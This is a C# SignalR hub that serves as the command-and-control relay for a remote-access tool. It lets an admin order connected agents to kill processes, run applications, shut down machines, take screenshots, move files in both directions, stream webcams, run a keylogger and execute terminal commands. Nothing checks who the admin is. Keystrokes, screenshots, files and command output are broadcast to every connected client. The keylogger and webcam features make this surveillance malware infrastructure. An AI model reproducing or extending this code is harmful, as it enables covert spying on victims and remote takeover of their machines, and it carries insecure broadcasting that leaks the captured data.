using Microsoft.AspNetCore.SignalR;
using System.Collections.Concurrent;

namespace WebApp.Hubs
{
    public class AgentInfo
    {
        public string MachineName { get; set; } = "";
        public DateTime LastHeartbeat { get; set; }
    }

    public class RemoteControlHub : Hub
    {
        // Thread-safe dictionary: ConnectionId -> AgentInfo
        public static readonly ConcurrentDictionary<string, AgentInfo> ConnectedAgents = new();

        public override Task OnConnectedAsync()
        {
            return base.OnConnectedAsync();
        }

        public override Task OnDisconnectedAsync(Exception? exception)
        {
            if (ConnectedAgents.TryRemove(Context.ConnectionId, out var info))
            {
                Clients.All.SendAsync("AgentDisconnected", Context.ConnectionId, info.MachineName);
            }
            return base.OnDisconnectedAsync(exception);
        }

        // Agent calls this to register
        public async Task RegisterAgent(string machineName)
        {
            ConnectedAgents.AddOrUpdate(Context.ConnectionId, 
                new AgentInfo { MachineName = machineName, LastHeartbeat = DateTime.UtcNow },
                (key, oldValue) => new AgentInfo { MachineName = machineName, LastHeartbeat = DateTime.UtcNow });
            
            await Clients.All.SendAsync("AgentConnected", Context.ConnectionId, machineName);
        }

        // Agent calls this every 10s
        public async Task Heartbeat(string machineName)
        {
            if (ConnectedAgents.TryGetValue(Context.ConnectionId, out var info))
            {
                info.LastHeartbeat = DateTime.UtcNow;
            }
            else
            {
                await RegisterAgent(machineName);
            }
            await Clients.All.SendAsync("ReceiveAgentHeartbeat", Context.ConnectionId);
        }

        // Admin calls this on load to get currently connected agents
        public async Task GetConnectedAgents()
        {
            var threshold = DateTime.UtcNow.AddSeconds(-65);
            var agentsList = ConnectedAgents
                .Where(x => x.Value.LastHeartbeat >= threshold)
                .Select(x => new { id = x.Key, name = x.Value.MachineName })
                .ToList();
            var json = System.Text.Json.JsonSerializer.Serialize(agentsList);
            await Clients.Caller.SendAsync("ReceiveConnectedAgents", json);
        }

        // Admin calls this to request processes from an Agent
        public async Task RequestProcesses(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("GetProcessesCommand");
        }

        // Agent responds with the process list back to Hub
        // DTO object: List<dynamic> or JSON string
        public async Task SendProcessesResult(string adminConnectionId, string processesJson)
        {
            // We just broadcast it to the requester (Admin)
            // If adminConnectionId is empty, broadcast to all.
            await Clients.All.SendAsync("ReceiveProcesses", Context.ConnectionId, processesJson);
        }

        // Admin calls this to Kill a process on a specific Agent
        public async Task KillProcess(string targetConnectionId, int processId)
        {
            await Clients.Client(targetConnectionId).SendAsync("KillProcessCommand", processId);
        }

        // --- NEW: Applications Management ---
        public async Task RequestApplications(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("GetApplicationsCommand");
        }

        public async Task SendApplicationsResult(string adminConnectionId, string appsJson)
        {
            await Clients.All.SendAsync("ReceiveApplications", Context.ConnectionId, appsJson);
        }

        public async Task StartApplication(string targetConnectionId, string appPath)
        {
            await Clients.Client(targetConnectionId).SendAsync("StartAppCommand", appPath);
        }

        // --- NEW: Power Management ---
        public async Task ShutdownDevice(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("ShutdownCommand");
        }

        public async Task RestartDevice(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("RestartCommand");
        }

        // --- NEW: Screen Capture ---
        public async Task RequestScreenshot(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("TakeScreenshotCommand");
        }

        // Agent responds with the Base64 image
        public async Task SendScreenshotResult(string adminConnectionId, string base64Image)
        {
            await Clients.All.SendAsync("ReceiveScreenshot", Context.ConnectionId, base64Image);
        }

        // --- NEW: File Manager ---
        public async Task RequestDirectoryContents(string targetConnectionId, string path)
        {
            await Clients.Client(targetConnectionId).SendAsync("GetDirectoryContentsCommand", path);
        }

        public async Task SendDirectoryContentsResult(string adminConnectionId, string path, string json)
        {
            await Clients.All.SendAsync("ReceiveDirectoryContents", Context.ConnectionId, path, json);
        }

        public async Task RequestFileDownload(string targetConnectionId, string filePath)
        {
            await Clients.Client(targetConnectionId).SendAsync("DownloadFileCommand", filePath);
        }

        public async Task UploadFileToAgent(string targetConnectionId, string dirPath, string fileName, string base64Data)
        {
            await Clients.Client(targetConnectionId).SendAsync("ReceiveFileUploadCommand", dirPath, fileName, base64Data);
        }

        public async Task SendFileResult(string adminConnectionId, string fileName, string base64Data)
        {
            await Clients.All.SendAsync("ReceiveFile", Context.ConnectionId, fileName, base64Data);
        }

        // --- NEW: Webcam Stream ---
        public async Task RequestWebcams(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("GetWebcamsCommand");
        }

        public async Task SendWebcamsResult(string adminConnectionId, string webcamsJson)
        {
            await Clients.All.SendAsync("ReceiveWebcams", Context.ConnectionId, webcamsJson);
        }

        public async Task RequestStartWebcam(string targetConnectionId, string cameraMoniker = "")
        {
            await Clients.Client(targetConnectionId).SendAsync("StartWebcamCommand", cameraMoniker ?? "");
        }

        public async Task RequestStopWebcam(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("StopWebcamCommand");
        }

        public async Task SendWebcamFrame(string adminConnectionId, string base64Image)
        {
            await Clients.All.SendAsync("ReceiveWebcamFrame", Context.ConnectionId, base64Image);
        }

        // --- NEW: Keylogger ---
        public async Task RequestStartKeylogger(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("StartKeyloggerCommand");
        }

        public async Task RequestStopKeylogger(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("StopKeyloggerCommand");
        }

        public async Task SendKeylogData(string targetConnectionId, string keys)
        {
            // Here targetConnectionId is actually the Hub caller (Agent) passing its ID to broadcast to All
            // Note: In a production app you'd map back to Admin, but broadcast is fine for MVP
            await Clients.All.SendAsync("ReceiveKeylog", Context.ConnectionId, keys);
        }

        // --- NEW: Terminal ---
        public async Task RequestExecuteCommand(string targetConnectionId, string command)
        {
            await Clients.Client(targetConnectionId).SendAsync("ExecuteTerminalCommand", command);
        }

        public async Task SendTerminalOutput(string adminConnectionId, string output)
        {
            await Clients.All.SendAsync("ReceiveTerminalOutput", Context.ConnectionId, output);
        }
    }
}
